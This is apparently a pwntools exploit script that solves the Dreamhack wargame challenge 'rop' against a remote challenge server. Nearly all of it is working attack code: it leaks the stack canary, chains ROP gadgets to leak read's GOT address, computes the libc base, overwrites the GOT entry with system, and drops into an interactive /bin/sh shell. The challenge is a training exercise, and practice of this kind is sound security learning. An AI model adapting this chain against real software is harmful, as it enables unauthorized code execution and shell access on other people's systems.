from pwn import*

context.log_level = 'debug'
def printlog(name, value):
	h_value = hex(value)
	print(f"{name} : {h_value}")

#p = process('./rop')
p = remote('host3.dreamhack.games', 22585)
elf = ELF('./rop')
libc = ELF('./libc.so.6')

#[1] canary leak
payload = b'a'*0x39
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = b'\x00' + p.recvn(7)
canary = u64(canary)
printlog("canary", canary)

#read2system = libc.symbols['read'] - libc.symbols['system']
read_plt = elf.plt['read']
read_got = elf.got['read']
write_plt = elf.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400596

#[2] bof to rop
payload = b'a'*0x38
payload += p64(canary)
payload += b'b'*8

#[3] return => write(1, read_got, ~)
payload += p64(pop_rdi) + p64(1) #rdi = 1
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) #rsi = read_got
payload += p64(write_plt)

#[4] read(0, read_got, ~)
payload += p64(pop_rdi) + p64(0) #rdi = 0
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0) #rsi = read_got
payload += p64(read_plt)

#[5] got overwrite => read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
read_addr = u64(p.recvn(6) + b'\x00'*2)
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
printlog("read address", read_addr)
printlog("libc_base", libc_base)
printlog("system address", system_addr)

p.send(p64(system_addr) + b'/bin/sh\x00')
p.interactive()
